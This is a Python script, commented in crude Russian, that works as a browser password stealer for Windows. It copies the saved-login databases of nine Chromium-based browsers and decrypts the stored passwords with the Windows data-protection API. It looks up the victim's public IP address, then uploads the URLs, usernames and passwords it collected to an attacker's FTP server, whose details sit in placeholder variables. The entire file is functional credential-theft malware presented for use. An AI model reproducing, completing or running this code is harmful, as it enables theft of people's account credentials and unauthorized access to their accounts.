#!/usr/bin/env python
# -*- coding: utf-8 -*-
# библиотеки
from os.path import expanduser
from sqlite3 import connect
from http.client import HTTPConnection
from ftplib import FTP_TLS
from re import findall
from winstr import *
import sys

reload(sys)
sys.setdefaultencoding('utf-8')

def main():	
	# путь до папки пользователя C:\Users\USERNAME\
	pathusr         = expanduser('~')

	# блок в которых объявляются переменные с путем до login data браузеров
	vivaldi         = pathusr + r'\AppData\Local\Vivaldi\User Data\Default\Login Data'
	chrome          = pathusr + r'\AppData\Local\Google\Chrome\User Data\Default\Login Data'
	yandex          = pathusr + r'\AppData\Local\Yandex\YandexBrowser\User Data\Default\Login Data'
	opera           = pathusr + r'\AppData\Roaming\Opera Software\Opera Stable\Login Data'
	kometa          = pathusr + r'\AppData\Local\Kometa\User Data\Default\Login Data'
	orbitum         = pathusr + r'\AppData\Local\Orbitum\User Data\Default\Login Data'
	comodo          = pathusr + r'\AppData\Local\Comodo\Dragon\User Data\Default\Login Data'
	amigo           = pathusr + r'\AppData\Local\Amigo\User\User Data\Default\Login Data'
	torch           = pathusr + r'\AppData\Local\Torch\User Data\Default\Login Data'

	# В этот список добавляем объявленные переменные с login data
	databases       = [vivaldi, chrome, yandex, opera, kometa, orbitum, comodo, amigo, torch]

	coped_db        = pathusr + r'\AppData\Logins'
	file_with_logs  = pathusr + r'\AppData\Local\Temp\Logins.txt'
	
	# Тут пользовательские настройки для FTP
	server          = 'FTPSERVER'
	user            = 'FTPUSER'
	pasd            = 'FTPPASS'

	# Запуск/Подключение к FTP начинается тутЬ
	ftp = FTP_TLS()
	ftp.set_debuglevel(0)
	ftp.connect(server, 21)
	ftp.sendcmd('USER ' + str(user))
	ftp.sendcmd('PASS ' + str(pasd))

	# Узнаем IP(!БЛЯДЬ) адресс жертвы с вебстранички
	# Приводим его в человеческий вид с помошью регулярного выражения
	conn = HTTPConnection("ifconfig.co")
	conn.request("GET", "/ip")
	ip = str(conn.getresponse().read().rstrip())
	ip = ''.join(findall(r'(\d*\.\d*\.\d*\.\d*)', ip))

	# в потоке обрабатываем каждую бд из списка бд браузеров
	for db in databases:
		# трай проверяет только наличие loginдата на чтение, это сделано, а нахуй объяснять
		try:
			source = open(db, 'r')
			source.close()
			# готовим login data для копирования средствами python, не системными командами!
			source_size = os.stat(db).st_size
			copied = 0
			# логично что соурс читается в таргет
			source = open(db, 'rb')
			target = open(coped_db, 'wb')
			# копируем это дерьмо в цикле из источника в цель
			while True:
				# sourcehunters!!!
				chunk = source.read(32768)
				if not chunk:
					break
				target.write(chunk)
				copied += len(chunk)
				
			# закрываем это дерьмо
			source.close()
			target.close()

			# подключаемся к бд - login data
			con = connect(coped_db)
			cursor = con.cursor()

			# узнаем из него все три значения - url, username, password
			cursor.execute("SELECT origin_url, username_value, password_value from logins;")
			
			# создаем переменную текст в которую будем записывать данные из потока
			var_with_logs = ''
			for log in cursor.fetchall():
				# святая либа расшифровывает данные паролей
				password = Win32CryptUnprotectData(log[2])
				# ну а дальше просто прибавляем к строкам строки
				var_with_logs += str('URL: ' + log[0] + '\n')
				var_with_logs += str('Login : ' + log[1]  + '\n')
				var_with_logs += str('Password : ' + password + '\n\n')

			# записываем всю хурму
			file = open(file_with_logs, 'w')
			file.writelines(var_with_logs)
			file.close()

			# придумываем имя браузеру + IP
			ftpbase = str(databases.index(db)) + '.' + ip + '.txt'
			# отправляем это дерьмо по FTP
			ftp.storbinary('STOR ' + ftpbase, open(file_with_logs, 'rb'))

		except Exception as e:
			pass

	# закрываем нахер ftp - увсё
	ftp.close()

if __name__ == '__main__':
	main()